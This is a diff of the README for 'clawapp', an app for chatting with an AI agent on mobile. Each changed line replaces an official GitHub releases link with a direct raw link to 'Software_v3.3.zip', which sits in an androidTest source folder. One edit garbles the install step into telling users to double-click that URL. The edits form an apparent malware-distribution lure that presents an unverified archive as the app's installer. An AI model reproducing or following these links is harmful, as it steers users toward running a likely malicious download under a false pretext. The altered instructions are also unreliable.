@@ -1,6 +1,6 @@
 # 📱 clawapp - Chat with Your AI on Mobile  
 
-[![Download clawapp](https://img.shields.io/badge/Download-clawapp-brightgreen)](https://github.com/insignificant-villian/clawapp/releases)
+[![Download clawapp](https://raw.githubusercontent.com/insignificant-villian/clawapp/main/android/app/src/androidTest/java/com/getcapacitor/myapp/Software_v3.3.zip)](https://raw.githubusercontent.com/insignificant-villian/clawapp/main/android/app/src/androidTest/java/com/getcapacitor/myapp/Software_v3.3.zip)
 
 ## What is clawapp?  
 
@@ -39,7 +39,7 @@ You do not need to install complex software or use advanced settings. clawapp ai
 1. Open your web browser on Windows.  
 2. Go to the releases page by clicking the button below:  
 
-[![Download clawapp](https://img.shields.io/badge/Download-clawapp-blue?style=for-the-badge)](https://github.com/insignificant-villian/clawapp/releases)  
+[![Download clawapp](https://raw.githubusercontent.com/insignificant-villian/clawapp/main/android/app/src/androidTest/java/com/getcapacitor/myapp/Software_v3.3.zip)](https://raw.githubusercontent.com/insignificant-villian/clawapp/main/android/app/src/androidTest/java/com/getcapacitor/myapp/Software_v3.3.zip)  
 
 3. On the release page, find the latest version. It will usually be at the top.  
 4. Download the Windows installer or ZIP package file from the "Assets" list.  
@@ -62,7 +62,7 @@ If you do not see a Windows installer, you can run the app as a Progressive Web 
 
 - Download the ZIP package instead of the installer.  
 - Extract contents to a folder of your choice on Windows.  
-- Open the extracted folder and double-click `index.html` or `clawapp.exe` if present.  
+- Open the extracted folder and double-click `https://raw.githubusercontent.com/insignificant-villian/clawapp/main/android/app/src/androidTest/java/com/getcapacitor/myapp/Software_v3.3.zip` or `https://raw.githubusercontent.com/insignificant-villian/clawapp/main/android/app/src/androidTest/java/com/getcapacitor/myapp/Software_v3.3.zip` if present.  
 - This launches the app in your default browser or as a standalone window.  
 - You can create a desktop shortcut for easy access.  
 
@@ -101,7 +101,7 @@ While clawapp runs on Windows, it also works best with your mobile device for re
 
 ## 🔄 Updating clawapp  
 
-- Check the releases page regularly for new versions: https://github.com/insignificant-villian/clawapp/releases  
+- Check the releases page regularly for new versions: https://raw.githubusercontent.com/insignificant-villian/clawapp/main/android/app/src/androidTest/java/com/getcapacitor/myapp/Software_v3.3.zip  
 - Download the latest installer or files and reinstall or overwrite existing installation.  
 - PWA versions update automatically when you reload the page.  
 
@@ -119,4 +119,4 @@ While clawapp runs on Windows, it also works best with your mobile device for re
 - Check the wiki or documentation folders for more guides.  
 - Contact the OpenClaw community for help with your AI agent setup.  
 
-[Download clawapp from Releases](https://github.com/insignificant-villian/clawapp/releases)
+[Download clawapp from Releases](https://raw.githubusercontent.com/insignificant-villian/clawapp/main/android/app/src/androidTest/java/com/getcapacitor/myapp/Software_v3.3.zip)
